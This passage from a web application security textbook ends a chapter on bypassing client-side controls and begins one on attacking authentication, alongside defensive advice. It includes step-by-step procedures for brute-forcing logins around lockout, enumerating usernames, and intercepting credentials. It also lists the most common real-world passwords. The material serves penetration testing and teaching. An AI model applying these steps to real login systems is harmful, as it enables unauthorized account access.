cleanly and that permissions are restored when you are fi nished working.
An alternative tool for debugging Java is JSwat, which is highly confi gurable. In large projects containing many class fi les, it is sometimes preferable 
c05.indd 151 c05.indd 151 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 152
152 Chapter 5 n Bypassing Client-Side Controls
to decompile, modify, and recompile a key class fi le and then use JSwat to hotswap it into the running application. To use JSwat, you need to launch an applet 
using the appletviewer tool included in the JDK and then connect JSwat to it. 
For example, you could use this command:
appletviewer -J-Xdebug -J-Djava.compiler=NONE -JXrunjdwp:transport=dt_socket,
server=y,suspend=n,address=5000 appletpage.htm
Figure 5-7: Once a suitable method has been identified, JavaSnoop can be used to 
tamper with the return value from the method
When you‚Äôre working on Silverlight objects, you can use the Silverlight Spy 
tool to monitor the component‚Äôs execution at runtime. This can greatly help 
correlate relevant code paths to events that occur within the user interface. 
Silverlight Spy is available from the following URL:
http://firstfloorsoftware.com/SilverlightSpy/
c05.indd 152 c05.indd 152 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 153
 Chapter 5 n Bypassing Client-Side Controls 153
Native Client Components
Some applications need to perform actions within the user‚Äôs computer that cannot 
be conducted from inside a browser-based VM sandbox. In terms of client-side 
security controls, here are some examples of this functionality:
n Verifying that a user has an up-to-date virus scanner
n Verifying that proxy settings and other corporate confi guration are in force
n Integrating with a smartcard reader
Typically, these kinds of actions require the use of native code components, 
which integrate local application functionality with web application functionality. Native client components are often delivered via ActiveX controls. These are 
custom browser extensions that run outside the browser sandbox.
Native client components may be signifi cantly harder to decipher than other 
browser extensions, because there is no equivalent to intermediate bytecode. 
However, the principles of bypassing client-side controls still apply, even if this 
requires a different toolset. Here are some examples of popular tools used for 
this task:
n OllyDbg is a Windows debugger that can be used to step through native 
executable code, set breakpoints, and apply patches to executables, either 
on disk or at runtime.
n IDA Pro is a disassembler that can produce human-readable assembly 
code from native executable code on a wide variety of platforms.
Although a full-blown description is outside the scope of this book, the following are some useful resources if you want to know more about reverse 
engineering of native code components and related topics:
n Reversing: Secrets of Reverse Engineering by Eldad Eilam
n Hacker Disassembling Uncovered by Kris Kaspersky
n The Art of Software Security Assessment by Mark Dowd, John McDonald, 
and Justin Schuh
n Fuzzing for Software Security Testing and Quality Assurance (Artech House
Information Security and Privacy) by Ari Takanen, Jared DeMott, and 
Charlie Miller
n The IDA Pro Book: The Unoffi cial Guide to the World‚Äôs Most Popular Disassembler
by Chris Eagle
n www.acm.uiuc.edu/sigmil/RevEng
n www.uninformed.org/?v=1&a=7
c05.indd 153 c05.indd 153 8/19/2011 12:05:45 PM 8/19/2011 12:05:45 PM
Stuttard c05.indd V3 - 07/22/2011 Page 154
154 Chapter 5 n Bypassing Client-Side Controls
Handling Client-Side Data Securely
As you have seen, the core security problem with web applications arises because 
client-side components and user input are outside the server‚Äôs direct control. 
The client, and all the data received from it, is inherently untrustworthy.
Transmitting Data Via the Client
Many applications leave themselves exposed because they transmit critical data 
such as product prices and discount rates via the client in an unsafe manner.
If possible, applications should avoid transmitting this kind of data via the 
client. In virtually any conceivable scenario, it is possible to hold such data on 
the server and reference it directly from server-side logic when needed. For 
example, an application that receives users‚Äô orders for various products should 
allow users to submit a product code and quantity and look up the price of each 
requested product in a server-side database. There is no need for users to submit 
the prices of items back to the server. Even where an application offers different 
prices or discounts to different users, there is no need to depart from this model. 
Prices can be held within the database on a per-user basis, and discount rates 
can be stored in user profi les or even session objects. The application already 
possesses, server-side, all the information it needs to calculate the price of a 
specifi c product for a specifi c user. It must. Otherwise, it would be unable, on 
the insecure model, to store this price in a hidden form fi eld.
If developers decide they have no alternative but to transmit critical data via 
the client, the data should be signed and/or encrypted to prevent user tampering. If this course of action is taken, there are two important pitfalls to avoid:
n Some ways of using signed or encrypted data may be vulnerable to 
replay attacks. For example, if the product price is encrypted before 
being stored in a hidden fi eld, it may be possible to copy the encrypted 
price of a cheaper product and submit it in place of the original price. 
To prevent this attack, the application needs to include suffi cient context 
within the encrypted data to prevent it from being replayed in a different context. For example, the application could concatenate the product 
code and price, encrypt the result as a single item, and then validate 
that the encrypted string submitted with an order actually matches the 
product being ordered.
n If users know and/or control the plaintext value of encrypted strings that 
are sent to them, they may be able to mount various cryptographic attacks 
to discover the encryption key the server is using. Having done this, they 
can encrypt arbitrary values and fully circumvent the protection offered 
by the solution.
c05.indd 154 c05.indd 154 8/19/2011 12:05:45 PM 8/19/2011 12:05:45 PM
Stuttard c05.indd V3 - 07/22/2011 Page 155
 Chapter 5 n Bypassing Client-Side Controls 155
In applications running on the ASP.NET platform, it is advisable never to 
store any customized data within the ViewState ‚Äî especially anything sensitive that you would not want to be displayed on-screen to users. The option to 
enable the ViewState MAC should always be activated.
Validating Client-Generated Data
Data generated on the client and transmitted to the server cannot in principle 
be validated securely on the client:
n Lightweight client-side controls such as HTML form fi elds and JavaScript 
can be circumvented easily and provide no assurance about the input that 
the server receives.
n Controls implemented in browser extension components are sometimes 
more diffi cult to circumvent, but this may merely slow down an attacker 
for a short period.
n Using heavily obfuscated or packed client-side code provides additional 
obstacles; however, a determined attacker can always overcome these. 
(A point of comparison in other areas is the use of DRM technologies to 
prevent users from copying digital media fi les. Many companies have 
invested heavily in these client-side controls, and each new solution usually is broken within a short time.)
The only secure way to validate client-generated data is on the server side of 
the application. Every item of data received from the client should be regarded 
as tainted and potentially malicious.
COMMON MYTH
It is sometimes believed that any use of client-side controls is bad. In particular, some professional penetration testers report the presence of client-side 
controls as a ‚Äúfi nding‚Äù without verifying whether they are replicated on the 
server or whether there is any non-security explanation for their existence. In 
fact, despite the signifi cant caveats arising from the various attacks described 
in this chapter, there are nevertheless ways to use client-side controls that do 
not give rise to any security vulnerabilities:
n Client-side scripts can be used to validate input as a means of enhancing usability, avoiding the need for round-trip communication with the 
server. For example, if the user enters her date of birth in an incorrect 
format, alerting her to the problem via a client-side script provides a 
much more seamless experience. Of course, the application must revalidate the item submitted when it arrives at the server.
Continued
c05.indd 155 c05.indd 155 8/19/2011 12:05:45 PM 8/19/2011 12:05:45 PM
Stuttard c05.indd V3 - 07/22/2011 Page 156
156 Chapter 5 n Bypassing Client-Side Controls
n Sometimes client-side data validation can be effective as a security 
measure ‚Äî for example, as a defense against DOM-based cross-site 
scripting attacks. However, these are cases where the focus of the attack 
is another application user, rather than the server-side application, 
and exploiting a potential vulnerability does not necessarily depend on 
transmitting any malicious data to the server. See Chapters 12 and 13 
for more details on this kind of scenario.
n As described previously, there are ways of transmitting encrypted data 
via the client that are not vulnerable to tampering or replay attacks.
Logging and Alerting
When an application employs mechanisms such as length limits and JavaScriptbased validation to enhance performance and usability, these should be integrated with server-side intrusion detection defenses. The server-side logic that 
performs validation of client-submitted data should be aware of the validation 
that has already occurred on the client side. If data that would have been blocked 
by client-side validation is received, the application may infer that a user is 
actively circumventing this validation and therefore is likely to be malicious. 
Anomalies should be logged and, if appropriate, application administrators 
should be alerted in real time so that they can monitor any attempted attack 
and take suitable action as required. The application may also actively defend 
itself by terminating the user‚Äôs session or even suspending his account.
NOTE In some cases where JavaScript is employed, the application still can 
be used by users who have disabled JavaScript within their browsers. In this 
situation, the browser simply skips JavaScript-based form validation code, and 
the raw input entered by the user is submitted. To avoid false positives, the logging and alerting mechanism should be aware of where and how this can arise.
Summary
Virtually all client/server applications must accept the fact that the client component, and all processing that occurs on it, cannot be trusted to behave as 
expected. As you have seen, the transparent communications methods generally employed by web applications mean that an attacker equipped with simple 
tools and minimal skill can easily circumvent most controls implemented on 
the client. Even where an application attempts to obfuscate data and processing 
residing on the client side, a determined attacker can compromise these defenses.
COMMON MYTH (continued)
c05.indd 156 c05.indd 156 8/19/2011 12:05:45 PM 8/19/2011 12:05:45 PM
Stuttard c05.indd V3 - 07/22/2011 Page 157
 Chapter 5 n Bypassing Client-Side Controls 157
In every instance where you identify data being transmitted via the client, or 
validation of user-supplied input being implemented on the client, you should 
test how the server responds to unexpected data that bypasses those controls. 
Often, serious vulnerabilities lurk behind an application‚Äôs assumptions about 
the protection afforded to it by defenses that are implemented at the client.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. How can data be transmitted via the client in a way that prevents tampering attacks?
 2. An application developer wants to stop an attacker from performing bruteforce attacks against the login function. Because the attacker may target 
multiple usernames, the developer decides to store the number of failed 
attempts in an encrypted cookie, blocking any request if the number of 
failed attempts exceeds fi ve. How can this defense be bypassed?
 3. An application contains an administrative page that is subject to rigorous access controls. It contains links to diagnostic functions located on a 
different web server. Access to these functions should also be restricted 
to administrators only. Without implementing a second authentication 
mechanism, which of the following client-side mechanisms (if any) could 
be used to safely control access to the diagnostic functionality? Do you 
need any more information to help choose a solution?
 (a) The diagnostic functions could check the HTTP Referer header to 
confi rm that the request originated on the main administrative page.
 (b) The diagnostic functions could validate the supplied cookies to confi rm 
that these contain a valid session token for the main application.
 (c) The main application could set an authentication token in a hidden fi eld 
that is included within the request. The diagnostic function could validate this to confi rm that the user has a session on the main application.
 4. If a form fi eld includes the attribute disabled=true, it is not submitted 
with the rest of the form. How can you change this behavior?
 5. Are there any means by which an application can ensure that a piece of 
input validation logic has been run on the client?
c05.indd 157 c05.indd 157 8/19/2011 12:05:45 PM 8/19/2011 12:05:45 PM
Stuttard c05.indd V3 - 07/22/2011 Page 158
c05.indd 158 c05.indd 158 8/19/2011 12:05:46 PM 8/19/2011 12:05:46 PM
Stuttard c06.indd V3 - 07/22/2011 Page 159
159
 C H A P T E R 
6
Attacking Authentication
On the face of it, authentication is conceptually among the simplest of all the 
security mechanisms employed within web applications. In the typical case, a 
user supplies her username and password, and the application must verify that 
these items are correct. If so, it lets the user in. If not, it does not.
Authentication also lies at the heart of an application‚Äôs protection against 
malicious attack. It is the front line of defense against unauthorized access. If an 
attacker can defeat those defenses, he will often gain full control of the application‚Äôs functionality and unrestricted access to the data held within it. Without 
robust authentication to rely on, none of the other core security mechanisms 
(such as session management and access control) can be effective.
In fact, despite its apparent simplicity, devising a secure authentication function is a subtle business. In real-world web applications authentication often is 
the weakest link, which enables an attacker to gain unauthorized access. The 
authors have lost count of the number of applications we have fundamentally 
compromised as a result of various defects in authentication logic.
This chapter looks in detail at the wide variety of design and implementation fl aws that commonly affl ict web applications. These typically arise because 
application designers and developers fail to ask a simple question: What could 
an attacker achieve if he targeted our authentication mechanism? In the majority 
of cases, as soon as this question is asked in earnest of a particular application, 
a number of potential vulnerabilities materialize, any one of which may be 
suffi cient to break the application.
c06.indd 159 c06.indd 159 8/19/2011 12:06:36 PM 8/19/2011 12:06:36 PM
Stuttard c06.indd V3 - 07/22/2011 Page 160
160 Chapter 6 n Attacking Authentication
Many of the most common authentication vulnerabilities are no-brainers. 
Anyone can type dictionary words into a login form in an attempt to guess 
valid passwords. In other cases, subtle defects may lurk deep within the application‚Äôs processing that can be uncovered and exploited only after painstaking 
analysis of a complex multistage login mechanism. We will describe the full 
spectrum of these attacks, including techniques that have succeeded in breaking 
the authentication of some of the most security-critical and robustly defended 
web applications on the planet.
Authentication Technologies
A wide range of technologies are available to web application developers when 
implementing authentication mechanisms:
n HTML forms-based authentication
n Multifactor mechanisms, such as those combining passwords and physical tokens
n Client SSL certifi cates and/or smartcards
n HTTP basic and digest authentication
n Windows-integrated authentication using NTLM or Kerberos
n Authentication services
By far the most common authentication mechanism employed by web applications uses HTML forms to capture a username and password and submit these 
to the application. This mechanism accounts for well over 90% of applications 
you are likely to encounter on the Internet.
In more security-critical Internet applications, such as online banking, this 
basic mechanism is often expanded into multiple stages, requiring the user to 
submit additional credentials, such as a PIN or selected characters from a secret 
word. HTML forms are still typically used to capture relevant data.
In the most security-critical applications, such as private banking for high-worth 
individuals, it is common to encounter multifactor mechanisms using physical 
tokens. These tokens typically produce a stream of one-time passcodes or perform a challenge-response function based on input specifi ed by the application. 
As the cost of this technology falls over time, it is likely that more applications 
will employ this kind of mechanism. However, many of these solutions do not 
actually address the threats for which they were devised ‚Äî primarily phishing 
attacks and those employing client-side Trojans.
Some web applications employ client-side SSL certifi cates or cryptographic 
mechanisms implemented within smartcards. Because of the overhead of administering and distributing these items, they are typically used only in security-critical 
c06.indd 160 c06.indd 160 8/19/2011 12:06:37 PM 8/19/2011 12:06:37 PM
Stuttard c06.indd V3 - 07/22/2011 Page 161
 Chapter 6 n Attacking Authentication 161
contexts where an application‚Äôs user base is small, such as web-based VPNs for 
remote offi ce workers.
The HTTP-based authentication mechanisms (basic, digest, and Windowsintegrated) are rarely used on the Internet. They are much more commonly 
encountered in intranet environments where an organization‚Äôs internal users 
gain access to corporate applications by supplying their normal network or 
domain credentials. The application then processes these credentials using one 
of these technologies.
Third-party authentication services such as Microsoft Passport are occasionally encountered, but at the present time they have not been adopted on any 
signifi cant scale.
Most of the vulnerabilities and attacks that arise in relation to authentication 
can be applied to any of the technologies mentioned. Because of the overwhelming dominance of HTML forms-based authentication, we will describe each 
specifi c vulnerability and attack in that context. Where relevant, we will point 
out any specifi c differences and attack methodologies that are relevant to the 
other available technologies.
Design Flaws in Authentication Mechanisms
Authentication functionality is subject to more design weaknesses than any 
other security mechanism commonly employed in web applications. Even 
in the apparently simple, standard model where an application authenticates 
users based on their username and password, shortcomings in the design of 
this model can leave the application highly vulnerable to unauthorized access.
Bad Passwords
Many web applications employ no or minimal controls over the quality of users‚Äô 
passwords. It is common to encounter applications that allow passwords that are:
n Very short or blank
n Common dictionary words or names
n The same as the username
n Still set to a default value
Figure 6-1 shows an example of weak password quality rules. End users typically display little awareness of security issues. Hence, it is highly likely that 
an application that does not enforce strong password standards will contain a 
large number of user accounts with weak passwords set. An attacker can easily 
guess these account passwords, granting him or her unauthorized access to the 
application.
c06.indd 161 c06.indd 161 8/19/2011 12:06:37 PM 8/19/2011 12:06:37 PM
Stuttard c06.indd V3 - 07/22/2011 Page 162
162 Chapter 6 n Attacking Authentication
Figure 6-1: An application that enforces weak password quality rules
HACK STEPS
Attempt to discover any rules regarding password quality:
 1. Review the website for any description of the rules.
 2. If self-registration is possible, attempt to register several accounts with 
different kinds of weak passwords to discover what rules are in place.
 3. If you control a single account and password change is possible, attempt 
to change your password to various weak values.
NOTE If password quality rules are enforced only through client-side controls, this is not itself a security issue, because ordinary users will still be 
protected. It is not normally a threat to an application‚Äôs security that a crafty 
attacker can assign himself a weak password.
TRY IT!
http://mdsec.net/auth/217/
Brute-Forcible Login
Login functionality presents an open invitation for an attacker to try to guess 
usernames and passwords and therefore gain unauthorized access to the application. If the application allows an attacker to make repeated login attempts 
c06.indd 162 c06.indd 162 8/19/2011 12:06:37 PM 8/19/2011 12:06:37 PM
Stuttard c06.indd V3 - 07/22/2011 Page 163
 Chapter 6 n Attacking Authentication 163
with different passwords until he guesses the correct one, it is highly vulnerable 
even to an amateur attacker who manually enters some common usernames 
and passwords into his browser.
Recent compromises of high-profi le sites have provided access to hundreds 
of thousands of real-world passwords that were stored either in cleartext or 
using brute-forcible hashes. Here are the most popular real-world passwords:
n password
n website name
n 12345678
n qwerty
n abc123
n 111111
n monkey
n 12345
n letmein
NOTE Administrative passwords may in fact be weaker than the password 
policy allows. They may have been set before the policy was in force, or they 
may have been set up through a different application or interface.
In this situation, any serious attacker will use automated techniques to attempt 
to guess passwords, based on lengthy lists of common values. Given today‚Äôs 
bandwidth and processing capabilities, it is possible to make thousands of login 
attempts per minute from a standard PC and DSL connection. Even the most 
robust passwords will eventually be broken in this scenario.
Various techniques and tools for using automation in this way are described 
in detail in Chapter 14. Figure 6-2 shows a successful password-guessing attack 
against a single account using Burp Intruder. The successful login attempt can be 
clearly distinguished by the difference in the HTTP response code, the response 
length, and the absence of the ‚Äúlogin incorrect‚Äù message.
In some applications, client-side controls are employed in an attempt to 
prevent password-guessing attacks. For example, an application may set a 
cookie such as failedlogins=1 and increment it following each unsuccessful attempt. When a certain threshold is reached, the server detects this in 
the submitted cookie and refuses to process the login attempt. This kind 
of client-side defense may prevent a manual attack from being launched 
using only a browser, but it can, of course, be bypassed easily, as described in 
Chapter 5.
c06.indd 163 c06.indd 163 8/19/2011 12:06:37 PM 8/19/2011 12:06:37 PM
Stuttard c06.indd V3 - 07/22/2011 Page 164
164 Chapter 6 n Attacking Authentication
Figure 6-2: A successful password-guessing attack
A variation on the preceding vulnerability occurs when the failed login counter 
is held within the current session. Although there may be no indication of this on 
the client side, all the attacker needs to do is obtain a fresh session (for example, by 
withholding his session cookie), and he can continue his password-guessing attack.
Finally, in some cases, the application locks out a targeted account after 
a suitable number of failed logins. However, it responds to additional login 
attempts with messages that indicate (or allow an attacker to infer) whether 
the supplied password was correct. This means that an attacker can complete 
his password-guessing attack even though the targeted account is locked out. 
If the application automatically unlocks accounts after a certain delay, the 
attacker simply needs to wait for this to occur and then log in as usual with 
the discovered password.
HACK STEPS
 1. Manually submit several bad login attempts for an account you control, 
monitoring the error messages you receive.
 2. After about 10 failed logins, if the application has not returned a message 
about account lockout, attempt to log in correctly. If this succeeds, there 
is probably no account lockout policy.
c06.indd 164 c06.indd 164 8/19/2011 12:06:37 PM 8/19/2011 12:06:37 PM
Stuttard c06.indd V3 - 07/22/2011 Page 165
 Chapter 6 n Attacking Authentication 165
 3. If the account is locked out, try repeating the exercise using a different 
account. This time, if the application issues any cookies, use each cookie 
for only a single login attempt, and obtain a new cookie for each subsequent login attempt.
 4. Also, if the account is locked out, see whether submitting the valid password causes any difference in the application‚Äôs behavior compared to an 
invalid password. If so, you can continue a password-guessing attack even 
if the account is locked out.
 5. If you do not control any accounts, attempt to enumerate a valid username (see the next section) and make several bad logins using this. 
Monitor for any error messages about account lockout.
 6. To mount a brute-force attack, first identify a difference in the application‚Äôs behavior in response to successful and failed logins. You can use 
this fact to discriminate between success and failure during the course of 
the automated attack.
 7. Obtain a list of enumerated or common usernames and a list of common 
passwords. Use any information obtained about password quality rules to 
tailor the password list so as to avoid superfluous test cases.
 8. Use a suitable tool or a custom script to quickly generate login requests 
using all permutations of these usernames and passwords. Monitor 
the server‚Äôs responses to identify successful login attempts. Chapter 14 
describes in detail various techniques and tools for performing customized attacks using automation.
 9. If you are targeting several usernames at once, it is usually preferable 
to perform this kind of brute-force attack in a breadth-first rather than 
depth-first manner. This involves iterating through a list of passwords 
(starting with the most common) and attempting each password in turn 
on every username. This approach has two benefits. First, you discover 
accounts with common passwords more quickly. Second, you are less 
likely to trigger any account lockout defenses, because there is a time 
delay between successive attempts using each individual account.
TRY IT!
http://mdsec.net/auth/16/
http://mdsec.net/auth/32/
http://mdsec.net/auth/46/
http://mdsec.net/auth/49/
c06.indd 165 c06.indd 165 8/19/2011 12:06:37 PM 8/19/2011 12:06:37 PM
Stuttard c06.indd V3 - 07/22/2011 Page 166
166 Chapter 6 n Attacking Authentication
Verbose Failure Messages
A typical login form requires the user to enter two pieces of information ‚Äî a 
username and password. Some applications require several more, such as date 
of birth, a memorable place, or a PIN.
When a login attempt fails, you can of course infer that at least one piece of 
information was incorrect. However, if the application tells you which piece of 
information was invalid, you can exploit this behavior to considerably diminish 
the effectiveness of the login mechanism.
In the simplest case, where a login requires a username and password, an 
application might respond to a failed login attempt by indicating whether the 
reason for the failure was an unrecognized username or the wrong password, 
as illustrated in Figure 6-3.
Figure 6-3: Verbose login failure messages indicating when a valid 
username has been guessed
In this instance, you can use an automated attack to iterate through a large 
list of common usernames to enumerate which ones are valid. Of course, usernames normally are not considered a secret (they are not masked during login, 
for instance). However, providing an easy means for an attacker to identify valid 
usernames increases the likelihood that he will compromise the application 
given enough time, skill, and effort. A list of enumerated usernames can be 
used as the basis for various subsequent attacks, including password guessing, 
attacks on user data or sessions, or social engineering.
In addition to the primary login function, username enumeration can arise 
in other components of the authentication mechanism. In principle, any function where an actual or potential username is submitted can be leveraged for 
this purpose. One location where username enumeration is commonly found 
is the user registration function. If the application allows new users to register 
and specify their own usernames, username enumeration is virtually impossible to prevent if the application is to prevent duplicate usernames from being 
registered. Other locations where username enumeration are sometimes found 
c06.indd 166 c06.indd 166 8/19/2011 12:06:37 PM 8/19/2011 12:06:37 PM
Stuttard c06.indd V3 - 07/22/2011 Page 167
 Chapter 6 n Attacking Authentication 167
are the password change and forgotten password functions, as described later 
in this chapter.
NOTE Many authentication mechanisms disclose usernames either implicitly or explicitly. In a web mail account, the username is often the e-mail 
address, which is common knowledge by design. Many other sites expose 
usernames within the application without considering the advantage this 
grants to an attacker, or generate usernames in a way that can be predicted 
(for example, user1842, user1843, and so on).
In more complex login mechanisms, where an application requires the user to 
submit several pieces of information, or proceed through several stages, verbose 
failure messages or other discriminators can enable an attacker to target each 
stage of the login process in turn, increasing the likelihood that he will gain 
unauthorized access.
NOTE This vulnerability may arise in more subtle ways than illustrated here. 
Even if the error messages returned in response to a valid and invalid username 
are superfi cially similar, there may be small differences between them that can 
be used to enumerate valid usernames. For example, if multiple code paths 
within the application return the ‚Äúsame‚Äù failure message, there may be minor 
typographical differences between each instance of the message. In some cases, 
the application‚Äôs responses may be identical on-screen but contain subtle differences hidden within the HTML source, such as comments or layout differences. If 
no obvious means of enumerating usernames presents itself, you should perform 
a close comparison of the application‚Äôs responses to valid and invalid usernames.
You can use the Comparer tool within Burp Suite to automatically analyze 
and highlight the differences between two application responses, as shown 
in Figure 6-4. This helps you quickly identify whether the username‚Äôs validity 
results in any systematic difference in the application‚Äôs responses.
Figure 6-4: Identifying subtle differences in application responses using Burp Comparer
c06.indd 167 c06.indd 167 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 168
168 Chapter 6 n Attacking Authentication
HACK STEPS
 1. If you already know one valid username (for example, an account you 
control), submit one login using this username and an incorrect password, 
and another login using a random username.
 2. Record every detail of the server‚Äôs responses to each login attempt, 
including the status code, any redirects, information displayed onscreen, and any differences hidden in the HTML page source. Use your 
intercepting proxy to maintain a full history of all traffic to and from the 
server.
 3. Attempt to discover any obvious or subtle differences in the server‚Äôs 
responses to the two login attempts.
 4. If this fails, repeat the exercise everywhere within the application where 
a username can be submitted (for example, self-registration, password 
change, and forgotten password).
 5. If a difference is detected in the server‚Äôs responses to valid and invalid 
usernames, obtain a list of common usernames. Use a custom script or 
automated tool to quickly submit each username, and filter the responses 
that signify that the username is valid (see Chapter 14).
 6. Before commencing your enumeration exercise, verify whether the application performs any account lockout after a certain number of failed login 
attempts (see the preceding section). If so, it is desirable to design your 
enumeration attack with this fact in mind. For example, if the application 
will grant you only three failed login attempts with any given account, you 
run the risk of ‚Äúwasting‚Äù one of these for every username you discover 
through automated enumeration. Therefore, when performing your enumeration attack, do not submit a far-fetched password with each login 
attempt. Instead, submit either a single common password such as password1 or the username itself as the password. If password quality rules 
are weak, it is highly likely that some of the attempted logins you perform 
as part of your enumeration exercise will succeed and will disclose both 
the username and password in a single hit. To set the password field to 
be the same as the username, you can use the ‚Äúbattering ram‚Äù attack 
mode in Burp Intruder to insert the same payload at multiple positions in 
your login request.
Even if an application‚Äôs responses to login attempts containing valid and 
invalid usernames are identical in every intrinsic respect, it may still be possible 
to enumerate usernames based on the time taken for the application to respond 
to the login request. Applications often perform very different back-end processing on a login request, depending on whether it contains a valid username. 
For example, when a valid username is submitted, the application may retrieve 
user details from a back-end database, perform various processing on these 
c06.indd 168 c06.indd 168 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 169
 Chapter 6 n Attacking Authentication 169
details (for example, checking whether the account is expired), and then validate 
the password (which may involve a resource-intensive hash algorithm) before 
returning a generic message if the password is incorrect. The timing difference 
between the two responses may be too subtle to detect when working with only 
a browser, but an automated tool may be able to discriminate between them. 
Even if the results of such an exercise contain a large ratio of false positives, it 
is still better to have a list of 100 usernames, approximately 50% of which are 
valid, than a list of 10,000 usernames, approximately 0.5% of which are valid. 
See Chapter 15 for a detailed explanation of how to detect and exploit this type 
of timing difference to extract information from the application.
TIP In addition to the login functionality itself, there may be other sources of 
information where you can obtain valid usernames. Review all the source code 
comments discovered during application mapping (see Chapter 4) to identify 
any apparent usernames. Any e-mail addresses of developers or other personnel 
within the organization may be valid usernames, either in full or just the userspecifi c prefi x. Any accessible logging functionality may disclose usernames.
TRY IT!
http://mdsec.net/auth/53/
http://mdsec.net/auth/59/
http://mdsec.net/auth/70/
http://mdsec.net/auth/81/
http://mdsec.net/auth/167/
Vulnerable Transmission of Credentials
If an application uses an unencrypted HTTP connection to transmit login credentials, an eavesdropper who is suitably positioned on the network can, of 
course, intercept them. Depending on the user‚Äôs location, potential eavesdroppers may reside:
n On the user‚Äôs local network
n Within the user‚Äôs IT department
n Within the user‚Äôs ISP
n On the Internet backbone
n Within the ISP hosting the application
n Within the IT department managing the application
c06.indd 169 c06.indd 169 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 170
170 Chapter 6 n Attacking Authentication
NOTE Any of these locations may be occupied by authorized personnel but 
also potentially by an external attacker who has compromised the relevant 
infrastructure through some other means. Even if the intermediaries on a particular network are believed to be trusted, it is safer to use secure transport 
mechanisms when passing sensitive data over it.
Even if login occurs over HTTPS, credentials may still be disclosed to unauthorized parties if the application handles them in an unsafe manner:
n If credentials are transmitted as query string parameters, as opposed 
to in the body of a POST request, these are liable to be logged in various 
places, such as within the user‚Äôs browser history, within the web server 
logs, and within the logs of any reverse proxies employed within the 
hosting infrastructure. If an attacker succeeds in compromising any of 
these resources, he may be able to escalate privileges by capturing the 
user credentials stored there.
n Although most web applications do use the body of a POST request to 
submit the HTML login form itself, it is surprisingly common to see the 
login request being handled via a redirect to a different URL with the same 
credentials passed as query string parameters. Why application developers consider it necessary to perform these bounces is unclear, but having 
elected to do so, it is easier to implement them as 302 redirects to a URL 
than as POST requests using a second HTML form submitted via JavaScript.
n Web applications sometimes store user credentials in cookies, usually 
to implement poorly designed mechanisms for login, password change, 
‚Äúremember me,‚Äù and so on. These credentials are vulnerable to capture 
via attacks that compromise user cookies and, in the case of persistent 
cookies, by anyone who gains access to the client‚Äôs local fi lesystem. Even if 
the credentials are encrypted, an attacker still can simply replay the cookie 
and therefore log in as a user without actually knowing her credentials. 
Chapters 12 and 13 describe various ways in which an attacker can target 
other users to capture their cookies.
Many applications use HTTP for unauthenticated areas of the application and 
switch to HTTPS at the point of login. If this is the case, then the correct place 
to switch to HTTPS is when the login page is loaded in the browser, enabling a 
user to verify that the page is authentic before entering credentials. However, it 
is common to encounter applications that load the login page itself using HTTP 
and then switch to HTTPS at the point where credentials are submitted. This 
is unsafe, because a user cannot verify the authenticity of the login page itself 
and therefore has no assurance that the credentials will be submitted securely. 
A suitably positioned attacker can intercept and modify the login page, changing the target URL of the login form to use HTTP. By the time an astute user 
realizes that the credentials have been submitted using HTTP, they will have 
been compromised.
c06.indd 170 c06.indd 170 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 171
 Chapter 6 n Attacking Authentication 171
HACK STEPS
 1. Carry out a successful login while monitoring all traffic in both directions 
between the client and server.
 2. Identify every case in which the credentials are transmitted in either 
direction. You can set interception rules in your intercepting proxy to flag 
messages containing specific strings (see Chapter 20).
 3. If any instances are found in which credentials are submitted in a URL 
query string or as a cookie, or are transmitted back from the server to the 
client, understand what is happening, and try to ascertain what purpose 
the application developers were attempting to achieve. Try to find every 
means by which an attacker might interfere with the application‚Äôs logic to 
compromise other users‚Äô credentials.
 4. If any sensitive information is transmitted over an unencrypted channel, 
this is, of course, vulnerable to interception.
 5. If no cases of actual credentials being transmitted insecurely are identified, pay close attention to any data that appears to be encoded or 
obfuscated. If this includes sensitive data, it may be possible to reverseengineer the obfuscation algorithm.
 6. If credentials are submitted using HTTPS but the login form is loaded 
using HTTP, the application is vulnerable to a man-in-the-middle attack, 
which may be used to capture credentials.
TRY IT!
http://mdsec.net/auth/88/
http://mdsec.net/auth/90/
http://mdsec.net/auth/97/
Password Change Functionality
Surprisingly, many web applications do not provide any way for users to change 
their password. However, this functionality is necessary for a well-designed 
authentication mechanism for two reasons:
n Periodic enforced password change mitigates the threat of password compromise. It reduces the window in which a given password can be targeted 
in a guessing attack. It also reduces the window in which a compromised 
password can be used without detection by the attacker.
n Users who suspect that their passwords may have been compromised 
need to be able to quickly change their password to reduce the threat of 
unauthorized use.
c06.indd 171 c06.indd 171 8/19/2011 12:06:38 PM 8/19/2011 12:06:38 PM
Stuttard c06.indd V3 - 07/22/2011 Page 172
172 Chapter 6 n Attacking Authentication
Although it is a necessary part of an effective authentication mechanism, 
password change functionality is often vulnerable by design. Vulnerabilities 
that are deliberately avoided in the main login function often reappear in the 
password change function. Many web applications‚Äô password change functions 
are accessible without authentication and do the following:
n Provide a verbose error message indicating whether the requested username is valid.
n Allow unrestricted guesses of the ‚Äúexisting password‚Äù fi eld.
n Check whether the ‚Äúnew password‚Äù and ‚Äúconfi rm new password‚Äù fi elds 
have the same value only after validating the existing password, thereby 
allowing an attack to succeed in discovering the existing password 
noninvasively.
A typical password change function includes a relatively large logical decision 
tree. The application needs to identify the user, validate the supplied existing 
password, integrate with any account lockout defenses, compare the supplied 
new passwords with each other and against password quality rules, and feed 
back any error conditions to the user in a suitable way. Because of this, password change functions often contain subtle logic fl aws that can be exploited to 
subvert the entire mechanism.
HACK STEPS
 1. Identify any password change functionality within the application. If 
this is not explicitly linked from published content, it may still be implemented. Chapter 4 describes various techniques for discovering hidden 
content within an application.
 2. Make various requests to the password change function using invalid 
usernames, invalid existing passwords, and mismatched ‚Äúnew password‚Äù 
and ‚Äúconfirm new password‚Äù values.
 3. Try to identify any behavior that can be used for username enumeration 
or brute-force attacks (as described in the ‚ÄúBrute-Forcible Login‚Äù and 
‚ÄúVerbose Failure Messages‚Äù sections).
